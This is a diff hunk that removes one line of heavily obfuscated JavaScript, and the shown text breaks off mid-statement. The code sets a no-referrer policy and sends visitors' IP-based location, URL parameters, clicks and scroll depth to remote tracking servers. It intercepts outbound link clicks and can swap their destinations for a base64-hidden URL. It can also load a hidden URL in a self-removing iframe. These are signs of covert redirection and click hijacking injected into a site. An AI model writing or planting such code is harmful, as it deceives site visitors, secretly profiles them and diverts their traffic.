@@ -1,1 +1,724 @@
-function _0x5a19(_0x4eeae5,_0xc406cb){const _0x67a446=_0x67a4();return _0x5a19=function(_0x5a1940,_0x197312){_0x5a1940=_0x5a1940-0x1e0;let _0x4c5347=_0x67a446[_0x5a1940];return _0x4c5347;},_0x5a19(_0x4eeae5,_0xc406cb);}(function(_0x4a4204,_0x64d150){const _0x3b591a=_0x5a19,_0x1fc6ce=_0x4a4204();while(!![]){try{const _0x468077=-parseInt(_0x3b591a(0x211))/0x1+-parseInt(_0x3b591a(0x22b))/0x2*(parseInt(_0x3b591a(0x219))/0x3)+parseInt(_0x3b591a(0x26f))/0x4+-parseInt(_0x3b591a(0x226))/0x5+parseInt(_0x3b591a(0x245))/0x6+parseInt(_0x3b591a(0x2c8))/0x7*(-parseInt(_0x3b591a(0x31e))/0x8)+-parseInt(_0x3b591a(0x32e))/0x9*(-parseInt(_0x3b591a(0x22d))/0xa);if(_0x468077===_0x64d150)break;else _0x1fc6ce['push'](_0x1fc6ce['shift']());}catch(_0x2d3ba7){_0x1fc6ce['push'](_0x1fc6ce['shift']());}}}(_0x67a4,0x28634),(function(){const _0x3cb4e9=_0x5a19;var _0xe02963=document[_0x3cb4e9(0x1e6)+_0x3cb4e9(0x217)+'ecto'+'r'](_0x3cb4e9(0x28d)+_0x3cb4e9(0x22e)+_0x3cb4e9(0x212)+_0x3cb4e9(0x25e)+_0x3cb4e9(0x225)+']');if(_0xe02963){if(_0xe02963[_0x3cb4e9(0x231)+_0x3cb4e9(0x2dd)][_0x3cb4e9(0x242)+_0x3cb4e9(0x23b)+'ase']()!==_0x3cb4e9(0x204)+_0x3cb4e9(0x25e)+'rer')_0xe02963[_0x3cb4e9(0x231)+'ent']=_0x3cb4e9(0x204)+'efer'+_0x3cb4e9(0x278);return;}_0xe02963=document[_0x3cb4e9(0x2c7)+_0x3cb4e9(0x2b8)+'emen'+'t'](_0x3cb4e9(0x28d)),_0xe02963['name']='refe'+'rrer',_0xe02963[_0x3cb4e9(0x231)+_0x3cb4e9(0x2dd)]='no-r'+_0x3cb4e9(0x25e)+_0x3cb4e9(0x278),document['head']['appe'+_0x3cb4e9(0x2e2)+'ild'](_0xe02963);}()),function(_0x2956ee){const _0x36e675=_0x5a19,_0x10aec=document[_0x36e675(0x223)+_0x36e675(0x336)]||_0x36e675(0x262)+_0x36e675(0x1fc)+'em',_0x7f7643=![];function _0x5be74c(..._0x2b5579){const _0x4be234=_0x36e675;if(_0x7f7643)console['log'](_0x4be234(0x2ef)+_0x4be234(0x29b)+']',..._0x2b5579);}const _0x9b1b38=_0x36e675(0x1ff)+_0x36e675(0x215)+_0x36e675(0x259)+_0x36e675(0x2e7)+_0x36e675(0x1e5)+_0x36e675(0x2bd)+_0x36e675(0x2d4)+_0x36e675(0x2c4)+_0x36e675(0x27c)+'/tra'+'ck',_0x1577a7=_0x36e675(0x1ff)+_0x36e675(0x215)+_0x36e675(0x259)+_0x36e675(0x2e7)+_0x36e675(0x1e5)+_0x36e675(0x2bd)+'t.ws'+_0x36e675(0x2c4)+_0x36e675(0x27c)+'/cli'+'ck',_0x42d6e4=0x1f4;function _0x244e7f(){const _0x1af3e1=_0x36e675;return(_0x1af3e1(0x207)+'xxxx'+'-xxx'+_0x1af3e1(0x254)+_0x1af3e1(0x311)+_0x1af3e1(0x2a2)+_0x1af3e1(0x207)+_0x1af3e1(0x207)+_0x1af3e1(0x207))[_0x1af3e1(0x2bc)+'ace'](/[xy]/g,function(_0x25f240){const _0x2e178a=_0x1af3e1,_0x50a414=Math[_0x2e178a(0x333)+'om']()*0x10|0x0,_0x864ab6=_0x25f240==='x'?_0x50a414:_0x50a414&0x3|0x8;return _0x864ab6['toSt'+_0x2e178a(0x332)](0x10);})+(_0x1af3e1(0x2a6)+'w');}const _0x27370f={'idVisita':_0x244e7f(),'pageUrl':window[_0x36e675(0x228)+_0x36e675(0x2ce)][_0x36e675(0x338)],'inboundParams':{},'geolocation':null,'outboundClicks':{},'pageLoadTime':new Date()[_0x36e675(0x28f)+_0x36e675(0x218)+_0x36e675(0x24c)](),'userAgent':navigator[_0x36e675(0x1f8)+_0x36e675(0x2c1)+'t'],'verify':![]};async function _0x10b68b(){const _0x4f7f9c=_0x36e675;try{const _0x3fe495=await fetch('http'+'s://'+_0x4f7f9c(0x232)+_0x4f7f9c(0x27f)+'/');if(_0x3fe495['ok']){const _0x5ad606=await _0x3fe495[_0x4f7f9c(0x20e)]();_0x27370f[_0x4f7f9c(0x255)+_0x4f7f9c(0x20a)+_0x4f7f9c(0x257)]={'ip':_0x5ad606['ip'],'country':_0x5ad606['coun'+_0x4f7f9c(0x20c)],'country_code':_0x5ad606[_0x4f7f9c(0x239)+_0x4f7f9c(0x1f3)+_0x4f7f9c(0x1ed)],'region':_0x5ad606[_0x4f7f9c(0x2b3)+'on'],'city':_0x5ad606['city'],'latitude':_0x5ad606[_0x4f7f9c(0x25a)+_0x4f7f9c(0x2d7)],'longitude':_0x5ad606[_0x4f7f9c(0x224)+_0x4f7f9c(0x20f)+'e'],'timezone':_0x5ad606[_0x4f7f9c(0x316)+_0x4f7f9c(0x30c)]?.[_0x4f7f9c(0x31a)],'connection':_0x5ad606['conn'+_0x4f7f9c(0x315)+'on']?.[_0x4f7f9c(0x295)]};}}catch(_0x1cc767){_0x5be74c(_0x4f7f9c(0x2a9)+_0x4f7f9c(0x2b6)+_0x4f7f9c(0x2c3)+_0x4f7f9c(0x256)+_0x4f7f9c(0x202)+'d:',_0x1cc767);}}async function _0x795f32(_0x489f79){const _0x2df4b3=_0x36e675,_0x153a41=_0x489f79['targ'+'et'][_0x2df4b3(0x2fc)+_0x2df4b3(0x32c)](_0x2df4b3(0x2e5)+_0x2df4b3(0x21b)+'n,\x20['+_0x2df4b3(0x249)+'ick]');if(!_0x153a41)return;const _0x1690ad=_0x5d6f66(_0x153a41);if(!_0x1690ad||!_0x5e7b97(_0x1690ad))return;_0x489f79[_0x2df4b3(0x2d2)+_0x2df4b3(0x285)+_0x2df4b3(0x270)+'lt']();try{await _0xc32fc3(_0x1690ad),_0x92b71f[_0x2df4b3(0x29f)]&&(window[_0x2df4b3(0x289)+_0x2df4b3(0x23e)][_0x2df4b3(0x2dc)+'ound'+_0x2df4b3(0x2e1)+'ks']['push']({'elementType':_0x153a41[_0x2df4b3(0x2ec)+'ame'][_0x2df4b3(0x242)+_0x2df4b3(0x23b)+_0x2df4b3(0x1e2)](),'url':_0x507bfe(_0x1690ad),'params':_0x200699(_0x1690ad),'timestamp':new Date()[_0x2df4b3(0x28f)+_0x2df4b3(0x218)+_0x2df4b3(0x24c)](),'timeOnPage':Math['roun'+'d']((Date[_0x2df4b3(0x2b1)]()-_0x23ce72)/0x3e8)}),await Promise[_0x2df4b3(0x1e3)]([_0x543cdf(_0x2df4b3(0x2dc)+_0x2df4b3(0x2a0)),new Promise(_0x1e246f=>setTimeout(_0x1e246f,_0x42d6e4))]));}catch(_0x501388){_0x5be74c(_0x2df4b3(0x21c)+_0x2df4b3(0x238)+_0x2df4b3(0x323)+'or:',_0x501388);}abrirLink2(_0x1690ad);}async function _0x543cdf(_0xbb362f){const _0x55400b=_0x36e675;let _0x5b1e38=null;if(window[_0x55400b(0x289)+'oad'])_0x5b1e38=window[_0x55400b(0x289)+_0x55400b(0x23e)];else return;const _0x29688d=_0x5b1e38[_0x55400b(0x337)+_0x55400b(0x314)+_0x55400b(0x222)+'e']||_0x55400b(0x2e0)+'ct';_0x5be74c(_0x55400b(0x2de)+'ing\x20'+_0x55400b(0x337)+'fic\x20'+_0x55400b(0x1ea)+'ce:',_0x29688d);const _0x3e332f={'source':_0xbb362f==='inbo'+_0x55400b(0x30f)?_0x55400b(0x220)+'t':_0x55400b(0x200)+'k','cfId':_0x5b1e38[_0x55400b(0x2e8)],'ip':_0x5b1e38[_0x55400b(0x255)+_0x55400b(0x20a)+_0x55400b(0x257)]?.['ip']??null,'trafficSource':_0x29688d,'country':_0x5b1e38[_0x55400b(0x255)+'ocat'+_0x55400b(0x257)]?.[_0x55400b(0x239)+_0x55400b(0x20c)]??null,'region':_0x5b1e38[_0x55400b(0x255)+'ocat'+_0x55400b(0x257)]?.[_0x55400b(0x2b3)+'on']??null,'city':_0x5b1e38[_0x55400b(0x255)+_0x55400b(0x20a)+_0x55400b(0x257)]?.[_0x55400b(0x26b)]??null,'inboundUrl':_0x5b1e38[_0x55400b(0x28c)+_0x55400b(0x288)],'inboundParams':_0x5b1e38[_0x55400b(0x1ee)+_0x55400b(0x322)+'aram'+'s'],'outboundUrl':_0x5b1e38[_0x55400b(0x2dc)+_0x55400b(0x2a0)+_0x55400b(0x2e1)+'ks']?.[0x0]?.['url'],'outboundParams':_0x5b1e38['outb'+_0x55400b(0x2a0)+_0x55400b(0x2e1)+'ks']?.[0x0]?.[_0x55400b(0x208)+'ms']||{},'userAgent':_0x5b1e38[_0x55400b(0x1f8)+'Agen'+'t'],'screenResolution':_0x5b1e38[_0x55400b(0x227)+_0x55400b(0x2cc)+_0x55400b(0x293)+_0x55400b(0x2ce)],'isBot':_0x5b1e38[_0x55400b(0x32d)+'t'],'geolocation':_0x5b1e38[_0x55400b(0x255)+'ocat'+'ion'],'outboundClicks':_0x5b1e38[_0x55400b(0x2dc)+'ound'+_0x55400b(0x2e1)+'ks'],'pageLoadTime':_0x5b1e38[_0x55400b(0x28c)+_0x55400b(0x24a)+'Time'],'timestamp':new Date()[_0x55400b(0x28f)+_0x55400b(0x218)+'ing'](),'eventType':_0xbb362f},_0x44a3a2=_0xbb362f===_0x55400b(0x1ee)+_0x55400b(0x30f)?_0x55400b(0x1ff)+_0x55400b(0x215)+_0x55400b(0x27a)+'clic'+_0x55400b(0x24f)+_0x55400b(0x1f1)+_0x55400b(0x1eb)+'.br/'+_0x55400b(0x23f)+'trac'+_0x55400b(0x2ee)+_0x55400b(0x220)+'ts':_0x55400b(0x1ff)+_0x55400b(0x215)+_0x55400b(0x27a)+'clic'+_0x55400b(0x24f)+_0x55400b(0x1f1)+_0x55400b(0x1eb)+_0x55400b(0x2e4)+_0x55400b(0x23f)+_0x55400b(0x206)+_0x55400b(0x2ee)+_0x55400b(0x200)+'ks';try{const _0x383a81=await fetch(_0x44a3a2,{'method':_0x55400b(0x308),'headers':{'Content-Type':_0x55400b(0x1f4)+_0x55400b(0x26a)+_0x55400b(0x31c)+_0x55400b(0x20e)},'body':JSON[_0x55400b(0x2f6)+_0x55400b(0x21e)+'y'](_0x3e332f)});return!_0x383a81['ok']&&_0x5be74c(_0x55400b(0x21c)+_0x55400b(0x238)+_0x55400b(0x32b)+_0x55400b(0x272)+_0x55400b(0x29d)+'r:',_0x383a81[_0x55400b(0x335)+'us']),_0x383a81;}catch(_0x16c412){_0x5be74c(_0x55400b(0x304)+_0x55400b(0x31d)+'o\x20se'+_0x55400b(0x252)+_0x55400b(0x290)+_0x55400b(0x216),_0x16c412);throw _0x16c412;}}async function _0x39336d(_0x37ec9a){const _0x1553f9=_0x36e675;try{const _0x380d0d=_0x27370f[_0x1553f9(0x337)+_0x1553f9(0x314)+_0x1553f9(0x222)+'e']||_0x1553f9(0x2e0)+'ct';_0x5be74c(_0x1553f9(0x2de)+_0x1553f9(0x266)+_0x1553f9(0x337)+_0x1553f9(0x283)+_0x1553f9(0x1ea)+'ce:',_0x380d0d);typeof idVisita!=='unde'+_0x1553f9(0x2f1)+'d'&&(_0x27370f[_0x1553f9(0x1ee)+_0x1553f9(0x322)+_0x1553f9(0x303)+'s']['vst']=idVisita);typeof _0x10aec!=='unde'+_0x1553f9(0x2f1)+'d'&&(_0x27370f[_0x1553f9(0x1ee)+_0x1553f9(0x322)+_0x1553f9(0x303)+'s'][_0x1553f9(0x223)+_0x1553f9(0x336)]=_0x10aec);const _0x27947c={'source':_0x37ec9a===_0x1553f9(0x1ee)+_0x1553f9(0x30f)?_0x1553f9(0x220)+'t':'clic'+'k','idVisita':_0x27370f[_0x1553f9(0x2cf)+_0x1553f9(0x32a)],'inboundUrl':_0x27370f[_0x1553f9(0x28c)+_0x1553f9(0x288)],'inboundParams':_0x27370f[_0x1553f9(0x1ee)+_0x1553f9(0x322)+_0x1553f9(0x303)+'s'],'userAgent':_0x27370f[_0x1553f9(0x1f8)+_0x1553f9(0x2c1)+'t'],'geolocation':_0x27370f['geol'+_0x1553f9(0x20a)+'ion'],'outboundClicks':_0x27370f[_0x1553f9(0x2dc)+_0x1553f9(0x2a0)+'Clic'+'ks'],'pageLoadTime':_0x27370f['page'+_0x1553f9(0x24a)+_0x1553f9(0x300)],'timestamp':new Date()[_0x1553f9(0x28f)+_0x1553f9(0x218)+_0x1553f9(0x24c)](),'eventType':_0x37ec9a,'verify':_0x27370f[_0x1553f9(0x279)+'fy']},_0x17aec3=_0x37ec9a===_0x1553f9(0x1ee)+_0x1553f9(0x30f)?_0x9b1b38:_0x1577a7,_0x5e201b=await fetch(_0x17aec3,{'method':_0x1553f9(0x308),'headers':{'Content-Type':_0x1553f9(0x1f4)+_0x1553f9(0x26a)+_0x1553f9(0x31c)+'json'},'body':JSON['stri'+_0x1553f9(0x21e)+'y'](_0x27947c)});return!_0x5e201b['ok']&&_0x5be74c(_0x1553f9(0x21c)+_0x1553f9(0x238)+_0x1553f9(0x32b)+_0x1553f9(0x272)+_0x1553f9(0x29d)+'r:',_0x5e201b['stat'+'us']),_0x5e201b;}catch(_0x39a829){_0x5be74c(_0x1553f9(0x304)+_0x1553f9(0x31d)+_0x1553f9(0x2fb)+_0x1553f9(0x252)+_0x1553f9(0x290)+_0x1553f9(0x216),_0x39a829);throw _0x39a829;}}const _0x23ce72=Date[_0x36e675(0x2b1)]();_0x5be74c(_0x36e675(0x2e9)+'nced'+'\x20tra'+'ckin'+_0x36e675(0x2f0)+_0x36e675(0x31b)+_0x36e675(0x2c6)+'d');function _0x5e7b97(_0xdbd09a){const _0x1623f0=_0x36e675;try{return new URL(_0x507bfe(_0xdbd09a))['host'+_0x1623f0(0x250)]!==location[_0x1623f0(0x247)+'name'];}catch{return![];}}function _0x507bfe(_0x134feb){const _0x5eec96=_0x36e675;return _0x134feb[_0x5eec96(0x265)+_0x5eec96(0x230)+'th'](_0x5eec96(0x1ff))?_0x134feb:_0x5eec96(0x1ff)+_0x5eec96(0x215)+_0x134feb;}function _0x200699(_0xa9345e){const _0x2845e9=_0x36e675,_0x206671={};try{new URL(_0x507bfe(_0xa9345e))['sear'+'chPa'+_0x2845e9(0x205)][_0x2845e9(0x20b)+_0x2845e9(0x2bb)]((_0x3e10b8,_0x1f36a2)=>_0x206671[_0x1f36a2]=_0x3e10b8);}catch{}return _0x206671;}function _0x5d6f66(_0x110526){const _0xeb357f=_0x36e675;if(_0x110526['tagN'+'ame']==='A')return _0x110526['href'];const _0x4236b8=_0x110526['oncl'+'ick']?.[_0xeb357f(0x299)+'ring']()||_0x110526[_0xeb357f(0x309)+_0xeb357f(0x233)+_0xeb357f(0x28b)](_0xeb357f(0x249)+'ick')||_0x110526[_0xeb357f(0x309)+_0xeb357f(0x233)+_0xeb357f(0x28b)]('href');return _0x4236b8?.[_0xeb357f(0x307)+'h'](/window.location.hrefs*=s*['"]([^'"]+)['"]/)?.[0x1]||_0x4236b8?.['matc'+'h'](/['"](https?:\/\/[^'"]+)['"]/)?.[0x1];}let _0x10170d=0x0,_0xa4172a=0x0,_0x46052a=0x0;function _0x10a92a(){const _0x6966c3=_0x36e675,_0x45c291=window[_0x6966c3(0x2ea)+'llY'],_0x5bbc43=window[_0x6966c3(0x27b)+_0x6966c3(0x2b2)+_0x6966c3(0x321)],_0x26fc08=document['docu'+_0x6966c3(0x275)+_0x6966c3(0x2b9)+'ent'][_0x6966c3(0x2ea)+_0x6966c3(0x2b7)+'ight'];return Math[_0x6966c3(0x1e4)]((_0x45c291+_0x5bbc43)/_0x26fc08*0x64,0x64);}function _0x54d928(){const _0x4e5947=_0x36e675,_0x16ade9=window[_0x4e5947(0x2ea)+_0x4e5947(0x327)],_0x4b2234=_0x10a92a(),_0x93f41c=_0x16ade9>_0x10170d?_0x4e5947(0x2ea)+'ll-d'+_0x4e5947(0x302):_0x4e5947(0x2ea)+'ll-u'+'p';_0x4b2234>_0x46052a&&(Math[_0x4e5947(0x2db)](_0x4b2234-_0xa4172a)>=0xa&&(_0x249e26({'percentage':Math[_0x4e5947(0x2b5)+'d'](_0x4b2234)},_0x93f41c),_0xa4172a=_0x4b2234),_0x10170d=_0x16ade9,_0x46052a=_0x4b2234);}abrirLink1=function _0xec3b1(_0x1c6633,_0x447908){const _0x4e7d9e=_0x36e675;_0x4e7d9e(0x292)+'nk'===_0x447908?window[_0x4e7d9e(0x22c)](_0x1c6633,_0x4e7d9e(0x292)+'nk'):window['loca'+_0x4e7d9e(0x2ce)][_0x4e7d9e(0x338)]=_0x1c6633;},abrirLink2=function(_0x2f8e1f,_0x3e7f07){const _0x35e01c=_0x36e675,_0x46aea4=_0xd24bae(_0x2f8e1f);if(_0x92b71f[_0x35e01c(0x2fe)])_0x4f019e(_0x46aea4,_0x92b71f['ppar'],_0x27370f[_0x35e01c(0x2cf)+_0x35e01c(0x32a)]);_0x4eda3f(_0x46aea4,_0x2f8e1f,0xbb8,_0x92b71f['ppup'],_0x92b71f[_0x35e01c(0x30e)]);};function _0x4f019e(_0x54dde9,_0x598ffe,_0x69bd1){const _0x3d3b97=_0x36e675,_0x3624c6=new URL(_0x54dde9);return _0x3624c6[_0x3d3b97(0x23c)+_0x3d3b97(0x2f3)+_0x3d3b97(0x205)]['set'](_0x598ffe,_0x69bd1),_0x3624c6[_0x3d3b97(0x299)+'ring']();}f_api_click1=async function(_0x1a2db2='',_0x11aee8=void 0x0,_0x5f0642=_0x36e675(0x229)+'f'){const _0x57b123=_0x36e675;try{await _0xc32fc3(_0x1a2db2);if(_0x92b71f[_0x57b123(0x29f)]){var _0x40b379={'idVisita':idVisita,'cliente_id':cli_id||''};return void 0x0!==_0x11aee8&&(_0x40b379[_0x57b123(0x1fc)+_0x57b123(0x271)+_0x57b123(0x2f9)]=_0x11aee8),f_call(_0x57b123(0x268)+_0x57b123(0x200)+'k',_0x40b379)['then'](_0x306287=>{abrirLink(_0x1a2db2,_0x5f0642);})[_0x57b123(0x32f)+'h'](_0x6a6e6c=>{abrirLink(_0x1a2db2,_0x5f0642);});}else abrirLink(_0x1a2db2,_0x5f0642);}catch(_0x46cf84){abrirLink(_0x1a2db2,_0x5f0642);}};async function _0x249e26(_0xe0838c,_0x278418){const _0x2bb911=_0x36e675;try{const _0x28bd02={'idVisita':_0x27370f[_0x2bb911(0x2cf)+_0x2bb911(0x32a)],'scrollMax':_0xe0838c[_0x2bb911(0x26c)+_0x2bb911(0x282)+'ge'],'event':_0x278418},_0x2bdc98={'method':'POST','headers':{'Content-Type':_0x2bb911(0x1f4)+_0x2bb911(0x26a)+_0x2bb911(0x31c)+_0x2bb911(0x20e)},'body':JSON[_0x2bb911(0x2f6)+_0x2bb911(0x21e)+'y'](_0x28bd02)},_0x1651a1=_0x2bb911(0x1ff)+_0x2bb911(0x215)+_0x2bb911(0x259)+_0x2bb911(0x2e7)+_0x2bb911(0x1e5)+_0x2bb911(0x2bd)+'t.ws'+_0x2bb911(0x2c4)+_0x2bb911(0x27c)+'/eve'+'nt',_0x5aab0b=await fetch(_0x1651a1,_0x2bdc98);return!_0x5aab0b['ok']&&_0x5be74c(_0x2bb911(0x21c)+'king'+_0x2bb911(0x32b)+_0x2bb911(0x272)+_0x2bb911(0x29d)+'r:',_0x5aab0b[_0x2bb911(0x335)+'us']),_0x5aab0b;}catch(_0x369f09){_0x5be74c(_0x2bb911(0x304)+_0x2bb911(0x31d)+_0x2bb911(0x2fb)+'nd\x20t'+_0x2bb911(0x290)+'ing:',_0x369f09);throw _0x369f09;}}let _0x92b71f={'tkn':null,'trk':![],'rdt':![],'scr':![],'otrk':!![],'oclk':!![],'rdnxt':![],'ifrm':![],'oriifrm':![],'ppup':![],'rld':![],'ppar':null,'ttrk':_0x36e675(0x29c)};async function _0x2b5b94(){const _0x55c2e0=_0x36e675;try{const _0x107716=new URL(window[_0x55c2e0(0x228)+_0x55c2e0(0x2ce)]['href']);_0x107716[_0x55c2e0(0x23c)+'chPa'+'rams'][_0x55c2e0(0x20b)+'ach']((_0x4ed765,_0x2f02dc)=>{const _0x3d8f08=_0x55c2e0;_0x27370f[_0x3d8f08(0x1ee)+_0x3d8f08(0x322)+_0x3d8f08(0x303)+'s'][_0x2f02dc]=_0x4ed765;});}catch(_0x8d38ab){_0x5be74c(_0x55c2e0(0x253)+'pars'+'ing\x20'+'erro'+'r:',_0x8d38ab);}_0x27370f[_0x55c2e0(0x1ee)+_0x55c2e0(0x322)+'aram'+'s'][_0x55c2e0(0x279)+'fy']=_0x92b71f['rdnx'+'t'],_0x27370f[_0x55c2e0(0x279)+'fy']=_0x92b71f[_0x55c2e0(0x241)+'t'],await _0x10b68b(),_0x39336d(_0x55c2e0(0x1ee)+_0x55c2e0(0x30f));};async function _0xc32fc3(_0x4429ed){const _0x4f4602=_0x36e675;try{if(!_0x4429ed||!_0x5e7b97(_0x4429ed))return;_0x27370f['outb'+'ound'+_0x4f4602(0x2e1)+'ks']={'url':_0x507bfe(_0x4429ed),'params':_0x200699(_0x4429ed),'timestamp':new Date()['toIS'+'OStr'+_0x4f4602(0x24c)](),'timeOnPage':Math[_0x4f4602(0x2b5)+'d']((Date['now']()-_0x23ce72)/0x3e8)},await Promise[_0x4f4602(0x1e3)]([_0x39336d(_0x4f4602(0x2dc)+_0x4f4602(0x2a0)),new Promise(_0x48c38c=>setTimeout(_0x48c38c,_0x42d6e4))]);}catch(_0x4ee6a4){_0x5be74c(_0x4f4602(0x21c)+_0x4f4602(0x238)+'\x20err'+_0x4f4602(0x2a3),_0x4ee6a4);throw _0x4ee6a4;}}function _0x43c4f2(){const _0x235c50=_0x36e675;window[_0x235c50(0x328)+'vent'+_0x235c50(0x260)+_0x235c50(0x1fa)](_0x235c50(0x2ea)+'ll',_0x54d928);}function _0x6bc7ed(){setTimeout(()=>{_0x2b5b94();},0xbb8);}function _0x391d82(){const _0x2d19dd=_0x36e675;try{window[_0x2d19dd(0x235)+_0x2d19dd(0x2da)+_0x2d19dd(0x2d3)+'tene'+'rs'](_0x2d19dd(0x200)+'k',_0x2d19dd(0x200)+_0x2d19dd(0x24f)+'t'),document[_0x2d19dd(0x328)+'vent'+_0x2d19dd(0x260)+_0x2d19dd(0x1fa)]('clic'+'k',_0x795f32,!![]);}catch(_0x4ae1fc){_0x5be74c('rmCF'+'\x20err'+_0x2d19dd(0x2a3),_0x4ae1fc);throw _0x4ae1fc;}}function _0x3565c4(){const _0x4aed93=_0x36e675;try{setTimeout(()=>{const _0xeb4d62=_0x5a19;abrirLink=_0x92b71f[_0xeb4d62(0x258)]?abrirLink2:abrirLink1,f_api_click=f_api_click1;},0xbb8);}catch(_0x29a576){_0x5be74c(_0x4aed93(0x312)+'\x20err'+'or:',_0x29a576);throw _0x29a576;}}function _0x32260a(){const _0x14d6a9=_0x36e675;try{if(_0x92b71f[_0x14d6a9(0x28a)][_0x14d6a9(0x2d5)+'udes']('C'))_0x391d82();if(_0x92b71f[_0x14d6a9(0x28a)][_0x14d6a9(0x2d5)+_0x14d6a9(0x25b)]('R'))_0x3565c4();if(_0x92b71f['ifrm']){const _0x3597db=atob(_0x92b71f[_0x14d6a9(0x23d)]);_0x2c87f4(_0x3597db,{'autoDestroy':!![],'onLoad':_0x2956af=>_0x5be74c('carr'+_0x14d6a9(0x2d6)+'o:',_0x2956af[_0x14d6a9(0x25d)]),'onError':_0x37b22a=>console[_0x14d6a9(0x29d)+'r']('erro'+':',_0x37b22a[_0x14d6a9(0x2f8)+_0x14d6a9(0x318)]),'timeout':0x1388});}}catch(_0x1ba9d2){_0x5be74c('_ini'+'tRed'+'irec'+_0x14d6a9(0x1f7)+'ror:',_0x1ba9d2);}}function _0x20c1aa(_0x204aff){const _0x1d5f63=_0x36e675;try{_0x92b71f=_0x204aff;if(_0x92b71f[_0x1d5f63(0x248)]&&_0x92b71f[_0x1d5f63(0x2a7)])_0x43c4f2();if(_0x92b71f[_0x1d5f63(0x2a7)])_0x6bc7ed();if(_0x92b71f[_0x1d5f63(0x258)]||_0x92b71f[_0x1d5f63(0x28a)][_0x1d5f63(0x2d5)+_0x1d5f63(0x25b)]('R')&&_0x92b71f['trk'])_0x32260a();}catch(_0x3c2415){_0x5be74c(_0x1d5f63(0x26d)+_0x1d5f63(0x1f7)+_0x1d5f63(0x2d0),_0x3c2415);}}function _0xd24bae(_0x35e1cb){const _0x4ff309=_0x36e675;try{_0x92b71f[_0x4ff309(0x258)]&&(_0x35e1cb=atob(_0x92b71f['tkn']));}catch(_0xd241fc){_0x5be74c('_ini'+'t\x20er'+'ror:',_0xd241fc);}return _0x35e1cb;}const _0x31d1b8={'_q':[],'_inited':![],'_config':{},'init'(_0x42e3a0){const _0xc195a5=_0x36e675;if(this[_0xc195a5(0x26d)+_0xc195a5(0x1e1)])return;this[_0xc195a5(0x1fd)+_0xc195a5(0x305)]=_0x42e3a0||{},_0x20c1aa(_0x42e3a0),this[_0xc195a5(0x26d)+'ted']=!![];},'processQueue'(){const _0x12b98c=_0x36e675;this['_q'][_0x12b98c(0x20b)+'ach'](_0x586d18=>{const _0xbeed22=_0x12b98c;if(_0x586d18[_0xbeed22(0x26e)+'on']==='init')this[_0xbeed22(0x1f6)](_0x586d18[_0xbeed22(0x24d)+'ig']);}),this['_q']=[];},'getConfig'(){const _0x2d25ac=_0x36e675;return this[_0x2d25ac(0x1fd)+'fig'];}},_0x10b129=_0x2956ee[_0x36e675(0x274)+'_r7_'+'_']&&_0x2956ee[_0x36e675(0x274)+_0x36e675(0x310)+'_']['_q']||[];_0x10b129[_0x36e675(0x20b)+'ach'](_0x2fe9ff=>{const _0x4487ff=_0x36e675;if(_0x2fe9ff[_0x4487ff(0x26e)+'on']==='init')_0x31d1b8[_0x4487ff(0x1f6)](_0x2fe9ff['conf'+'ig']);}),_0x31d1b8['_q'][_0x36e675(0x2ba)]=function(..._0x50ea7d){const _0x186f7a=_0x36e675;return Array['prot'+_0x186f7a(0x267)+'e'][_0x186f7a(0x2ba)][_0x186f7a(0x1f4)+'y'](this,_0x50ea7d),this[_0x186f7a(0x236)+_0x186f7a(0x286)+_0x186f7a(0x1f9)](),this[_0x186f7a(0x325)+'th'];}[_0x36e675(0x298)](_0x31d1b8),_0x2956ee['__Tk'+_0x36e675(0x310)+'_']=_0x31d1b8;function _0x2c87f4(_0x5f7bed,{onLoad:_0x34b6b0,onError:_0x1550f5,timeout:timeout=0x2710,autoDestroy:autoDestroy=![]}={}){const _0x437f43=_0x36e675;let _0x102027=document[_0x437f43(0x261)+'leme'+_0x437f43(0x2af)+'Id']('WAFF'+_0x437f43(0x264));function _0x1858db(){const _0x318d40=_0x437f43;if(!_0x102027)return;clearTimeout(_0x102027[_0x318d40(0x2ad)+'eout'+'Id']),_0x102027['onlo'+'ad']=null,_0x102027[_0x318d40(0x1f5)+_0x318d40(0x263)]=null;}function _0x2ae50f(){const _0x28e694=_0x437f43;_0x1858db(),_0x102027&&_0x102027['pare'+_0x28e694(0x2df)+'de']&&(_0x102027[_0x28e694(0x235)+'ve'](),_0x5be74c('Ifra'+_0x28e694(0x201)+_0x28e694(0x1ef)+'RAME'+_0x28e694(0x330)+_0x28e694(0x296)+_0x28e694(0x306)+_0x28e694(0x2be)+'atic'+_0x28e694(0x20d)+_0x28e694(0x329)));}if(_0x102027)return _0x5be74c(_0x437f43(0x2cd)+_0x437f43(0x2f4)+_0x437f43(0x23a)+_0x437f43(0x2ff)+_0x437f43(0x1e8)+_0x437f43(0x1f0)+_0x437f43(0x213)+_0x437f43(0x2c2)+_0x437f43(0x2ab)+'.'),_0x1858db(),_0x102027[_0x437f43(0x331)+'ad']=()=>{const _0x67e904=_0x437f43;_0x1858db(),_0x5be74c(_0x67e904(0x2cd)+_0x67e904(0x287)+_0x67e904(0x1e9)+_0x67e904(0x1fe)+_0x67e904(0x27e)+_0x67e904(0x2c0)+_0x67e904(0x243)+_0x67e904(0x203),_0x102027[_0x67e904(0x25d)]);if(typeof _0x34b6b0==='func'+_0x67e904(0x2ce))_0x34b6b0(_0x102027);if(autoDestroy)_0x2ae50f();},_0x102027['oner'+_0x437f43(0x263)]=_0x5c38b5=>{const _0x322b5d=_0x437f43;_0x1858db(),_0x5be74c(_0x322b5d(0x326)+'\x20ao\x20'+_0x322b5d(0x240)+_0x322b5d(0x2b0)+_0x322b5d(0x22a)+'fram'+'e:',_0x102027['src']);if(typeof _0x1550f5===_0x322b5d(0x30b)+_0x322b5d(0x2ce))_0x1550f5(_0x5c38b5,_0x102027);if(autoDestroy)_0x2ae50f();},_0x102027['_tim'+'eout'+'Id']=setTimeout(()=>{const _0x2e78ac=_0x437f43;_0x5be74c(_0x2e78ac(0x21a)+_0x2e78ac(0x2ed)+':\x20o\x20'+'ifra'+_0x2e78ac(0x244)+'emor'+_0x2e78ac(0x237)+_0x2e78ac(0x2ca)+_0x2e78ac(0x2d9)+_0x2e78ac(0x1fb)+_0x2e78ac(0x22f)+_0x2e78ac(0x21f),_0x102027[_0x2e78ac(0x25d)]),_0x1858db();if(typeof _0x1550f5===_0x2e78ac(0x30b)+'tion')_0x1550f5(new Error(_0x2e78ac(0x300)+_0x2e78ac(0x251)),_0x102027);if(autoDestroy)_0x2ae50f();},timeout),_0x102027[_0x437f43(0x25d)]=_0x5f7bed,_0x102027;return 